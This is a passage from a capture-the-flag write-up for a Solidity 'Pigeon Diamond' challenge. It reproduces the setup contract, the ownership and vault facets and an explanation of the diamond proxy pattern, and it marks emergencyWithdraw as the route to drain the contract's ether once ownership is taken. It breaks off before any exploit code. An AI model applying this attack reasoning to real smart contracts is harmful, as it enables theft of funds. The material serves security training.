</span></span><span class="line"><span class="cl">        <span class="c1">// Setup DiamondLoupeFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">diamondLoupeSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;cdffacc6&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;52ef6b2c&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeSelectors</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;adfca15e&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeSelectors</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;7a0ed627&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeSelectors</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;01ffc9a7&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">diamondCut</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">diamondLoupeFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Add</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">diamondLoupeSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Setup OwnershipFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ownershipFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;8da5cb5b&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;f2fde38b&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">diamondCut</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">ownershipFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Add</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">ownershipFacetSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Setup FTCFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ftcFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;dd62ed3e&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;095ea7b3&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;70a08231&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;313ce567&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;5c19a95c&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;34940fa8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;b4b5ea57&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;42061268&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;782d6fe1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;40c10f19&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;06fdde03&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;95d89b41&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;18160ddd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;a9059cbb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacetSelectors</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;23b872dd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">diamondCut</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">ftcFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Add</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">ftcFacetSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Setup DAOFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">daoFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">daoFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;aad6756f&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">daoFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;0d61b519&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">daoFacetSelectors</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;ece40cc1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">daoFacetSelectors</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;abdc14c5&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">diamondCut</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">daoFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Add</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">daoFacetSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Setup PigeonVaultFacet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">pigeonVaultFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonVaultFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;8b7afe2e&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonVaultFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;db2e21bc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonVaultFacetSelectors</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;32a2c5d0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">diamondCut</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">pigeonVaultFacet</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Add</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">pigeonVaultFacetSelectors</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">init</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">InitDiamond</span><span class="p">.</span><span class="n">init</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">ftcFacet</span><span class="p">)),</span> <span class="kt">address</span><span class="p">(</span><span class="n">pigeonVaultFacet</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IDiamondCut</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="n">diamondCut</span><span class="p">(</span><span class="n">diamondCut</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">initDiamond</span><span class="p">),</span> <span class="n">init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;ETH failed to send&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Ensure everything is setup correctly
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">facetAddresses</span> <span class="o">=</span> <span class="n">IDiamondLoupe</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="n">facetAddresses</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="n">facetAddresses</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">claim</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">claimed</span><span class="p">,</span> <span class="s">&#34;You already claimed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="mi">10</span><span class="n">_000</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Failed to send&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">IOwnershipFacet</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">)).</span><span class="n">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">&amp;&amp;</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="mi">3000</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the setup contract. In order to solve the challenge, we need to become the <code>owner</code> of the <code>pigeonDiamond</code> contract, and have ether more than 3000 ether. Some initial state:</p>
<ul>
<li>The <code>pigeonDiamond</code> has 1 million <code>IERC20</code> token (newly minted).</li>
<li>We can call <code>claim</code> to get some of the newly minted token from the <code>Setup</code> contract.</li>
</ul>
<p>Diving more through the setup contract, we observed that what the setup code trying to do is:</p>
<ul>
<li>Create a diamond called <code>pigeonDiamond</code></li>
<li>Initialize it with some facets. List of the facets:
<ul>
<li><code>DiamondCutFacet</code></li>
<li><code>DiamondLoupeFacet</code></li>
<li><code>OwnershipFacet</code></li>
<li><code>FTCFacet</code></li>
<li><code>DAOFacet</code></li>
<li><code>PigeonVaultFacet</code></li>
</ul>
</li>
</ul>
<p>How the diamond pattern works in simplified version is that:</p>
<ul>
<li>A diamond store a mapping which will map the function selectors with the correct <code>facet</code> address.</li>
<li>Everytime we call a function in the diamond, the diamond will try to route the call to the correct <code>facet</code> address based on the called function selector.</li>
<li>With the help of <code>IDiamondCut</code> interface, we can easily add/replace/remove this selectors. For example, if we want to replace an existing selectors, than what we need to do:
<ul>
<li>Deploy a new facet with the same selector</li>
<li>Call <code>diamondCut</code> to upgdate the selectors mapping.</li>
</ul>
</li>
</ul>
<p>Let&rsquo;s try to check the available facets.</p>
<p><strong>OwnershipFacet.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC173</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../interfaces/IERC173.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">OwnershipFacet</span> <span class="k">is</span> <span class="n">IERC173</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferOwnership</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newOwner</span><span class="p">)</span> <span class="k">external</span> <span class="k">override</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">enforceIsContractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">setContractOwner</span><span class="p">(</span><span class="n">_newOwner</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">owner_</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner_</span> <span class="o">=</span> <span class="n">LibDiamond</span><span class="p">.</span><span class="n">contractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is a function called <code>transferOwnership</code>, however for now, we can only call it if we&rsquo;re the <code>owner</code>.</p>
<p><strong>PigeonVault.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">AppStorage</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibAppStorage.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">PigeonVaultFacet</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">AppStorage</span> <span class="k">internal</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">account</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">emergencyWithdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">enforceIsContractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">owner</span> <span class="o">=</span> <span class="n">LibDiamond</span><span class="p">.</span><span class="n">contractOwner</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">owner</span><span class="p">)).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;PigeonVaultFacet: emergency withdraw failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">contractBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getContractAddress</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// receive() external payable {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     emit Deposit(msg.sender, msg.value);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is a function called <code>emergencyWithdraw</code>, that will allow us to drain the diamond&rsquo;s ether. However, once again, we can only call it if we&rsquo;re the <code>owner</code>.</p>
<p><strong>DAOFacet.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
